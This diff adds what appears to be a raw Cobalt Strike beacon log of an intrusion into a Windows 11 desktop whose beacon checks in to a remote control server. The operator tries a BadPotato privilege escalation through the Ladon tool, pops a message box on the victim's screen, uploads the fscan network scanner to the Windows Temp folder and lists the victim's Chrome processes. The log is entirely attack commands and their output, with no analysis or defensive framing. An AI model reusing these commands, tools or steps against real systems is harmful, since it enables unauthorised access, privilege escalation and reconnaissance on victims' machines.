@@ -1,0 +1,112 @@
+02/04 08:11:59 UTC [metadata] 20.212.216.40 <- 172.19.0.1; computer: DESKTOP-LCF39C6; user: ZhuanZ（无密码）; process: beacon.exe; pid: 9772; os: Windows; version: 6.2; build: 9200; beacon arch: x86 (x64)
+02/04 08:11:52 UTC [task] <T1029> Tasked beacon to become interactive
+02/04 08:12:22 UTC [output]
+Ladon BadPotato whoami
+
+02/04 08:12:51 UTC [checkin] host called home, sent: 284251 bytes
+02/04 08:13:00 UTC [output]
+received output:
+Ladon 9.1.1 For CobaltStrike
+Start: 2024-02-04 16:14:01
+Runtime: .net 4.0  ME: x64 OS: x64
+OS Name: Microsoft Windows 11 专业版
+Machine Make: LENOVO
+RunUser: ZhuanZ（无密码） PR: -IsUser
+PID: 14696  CurrentProcess: rundll32
+FreeSpace: Disk C:\ 80146 MB
+
+Load BadPotato
+[*] PipeName : \\.\pipe\2e597c55bd5c454ab71c0ddd65a37794\pipe\spoolss
+[*] ConnectPipeName : \\DESKTOP-LCF39C6/pipe/2e597c55bd5c454ab71c0ddd65a37794
+[*] CreateNamedPipeW Success! IntPtr:1236
+[!] RpcOpenPrinter fail!
+
+
+02/04 08:13:10 UTC [output]
+9========== 聊天弹框 ==========
+
+02/04 08:13:12 UTC [task] <T1086> Tasked beacon to run: Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::MsgBox("你好！", "OKOnly,MsgBoxSetForeground,SystemModal,Exclamation", "")
+02/04 08:13:12 UTC [output]
+发送消息: 你好！ 
+
+02/04 08:13:12 UTC [checkin] host called home, sent: 475 bytes
+02/04 08:13:14 UTC [output]
+received output:
+#< CLIXML
+Ok
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>正在准备首次使用模块。</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>
+
+02/04 08:52:11 UTC [output]
+9=========== 上传 Fscan ==========
+
+02/04 08:52:31 UTC [task] <> cd C:\Windows\Temp\
+02/04 08:52:35 UTC [checkin] host called home, sent: 24 bytes
+02/04 08:52:52 UTC [task] <> Tasked beacon to upload C:\Users\Anonymous\Desktop\fsdownload\LSTAR\scripts\IntrScan\x64\fscan.exe as fscan.exe
+02/04 08:52:53 UTC [checkin] host called home, sent: 786453 bytes
+02/04 08:52:55 UTC [warning] Unable to add task of 260117 bytes as it is over the available size of 8108 bytes. 1 task(s) on hold until next checkin.
+02/04 08:52:55 UTC [checkin] host called home, sent: 1040468 bytes
+02/04 08:52:58 UTC [warning] Unable to add task of 260117 bytes as it is over the available size of 8108 bytes. 2 task(s) on hold until next checkin.
+02/04 08:52:58 UTC [checkin] host called home, sent: 1040468 bytes
+02/04 08:52:59 UTC [warning] Unable to add task of 260117 bytes as it is over the available size of 8108 bytes. 2 task(s) on hold until next checkin.
+02/04 08:52:59 UTC [checkin] host called home, sent: 1040468 bytes
+02/04 08:53:01 UTC [indicator] file: 0f7baf15408a49895439aa273ee7f867 5127168 bytes fscan.exe
+02/04 08:53:02 UTC [warning] Unable to add task of 179221 bytes as it is over the available size of 8108 bytes. 1 task(s) on hold until next checkin.
+02/04 08:53:02 UTC [checkin] host called home, sent: 1040468 bytes
+02/04 08:53:05 UTC [checkin] host called home, sent: 179221 bytes
+02/04 08:54:50 UTC [output]
+9=========== 上传 Fscan ==========
+
+02/04 08:54:52 UTC [task] <> cd C:\Windows\Temp\
+02/04 08:55:00 UTC [checkin] host called home, sent: 24 bytes
+02/04 08:55:11 UTC [task] <> Tasked beacon to upload C:\Users\Anonymous\Desktop\fsdownload\LSTAR\scripts\IntrScan\x64\fscan.exe as fscan.exe
+02/04 08:55:12 UTC [checkin] host called home, sent: 786453 bytes
+02/04 08:55:15 UTC [warning] Unable to add task of 260117 bytes as it is over the available size of 8108 bytes. 2 task(s) on hold until next checkin.
+02/04 08:55:15 UTC [checkin] host called home, sent: 1040468 bytes
+02/04 08:55:19 UTC [warning] Unable to add task of 260117 bytes as it is over the available size of 8108 bytes. 7 task(s) on hold until next checkin.
+02/04 08:55:19 UTC [checkin] host called home, sent: 1040468 bytes
+02/04 08:55:19 UTC [indicator] file: 0f7baf15408a49895439aa273ee7f867 5127168 bytes fscan.exe
+02/04 08:55:23 UTC [warning] Unable to add task of 260117 bytes as it is over the available size of 8108 bytes. 5 task(s) on hold until next checkin.
+02/04 08:55:23 UTC [checkin] host called home, sent: 1040468 bytes
+02/04 08:55:29 UTC [warning] Unable to add task of 179221 bytes as it is over the available size of 8108 bytes. 1 task(s) on hold until next checkin.
+02/04 08:55:29 UTC [checkin] host called home, sent: 1040468 bytes
+02/04 08:55:34 UTC [checkin] host called home, sent: 179221 bytes
+02/04 09:40:06 UTC [input] <karson> shell tasklist | findstr "chrome"
+02/04 09:40:06 UTC [task] <T1059> Tasked beacon to run: tasklist | findstr "chrome"
+02/04 09:40:14 UTC [checkin] host called home, sent: 58 bytes
+02/04 09:40:15 UTC [output]
+received output:
+chrome.exe                   13488 Console                    1    279,640 K
+chrome.exe                   11352 Console                    1      7,080 K
+chrome.exe                   10764 Console                    1    341,904 K
+chrome.exe                    4156 Console                    1     51,120 K
+chrome.exe                    3984 Console                    1     24,808 K
+chrome.exe                   14516 Console                    1     66,652 K
+chrome.exe                   14468 Console                    1    183,336 K
+chrome.exe                    6888 Console                    1     24,820 K
+chrome.exe                   14712 Console                    1     63,988 K
+chrome.exe                   14800 Console                    1    479,028 K
+chrome.exe                    3064 Console                    1     85,752 K
+chrome.exe                   10592 Console                    1     68,088 K
+chrome.exe                    9708 Console                    1     48,096 K
+chrome.exe                    4064 Console                    1     84,776 K
+chrome.exe                   14216 Console                    1     70,752 K
+chrome.exe                    2964 Console                    1     86,160 K
+chrome.exe                   11416 Console                    1    102,192 K
+chrome.exe                    2848 Console                    1     75,648 K
+chrome.exe                   13872 Console                    1     82,404 K
+chrome.exe                   10076 Console                    1     82,008 K
+chrome.exe                    2440 Console                    1     49,384 K
+chrome.exe                   13148 Console                    1     99,532 K
+chrome.exe                     404 Console                    1     78,544 K
+chrome.exe                   12480 Console                    1     78,216 K
+chrome.exe                    9096 Console                    1     73,000 K
+chrome.exe                    7396 Console                    1     93,844 K
+chrome.exe                    8920 Console                    1     87,112 K
+chrome.exe                    9440 Console                    1     66,604 K
+chrome.exe                   16124 Console                    1    151,132 K
+chrome.exe                   16372 Console                    1    109,504 K
+chrome.exe                    4604 Console                    1    144,752 K
+chrome.exe                   15700 Console                    1    117,436 K
+chrome.exe                    7748 Console                    1     28,196 K
+
+
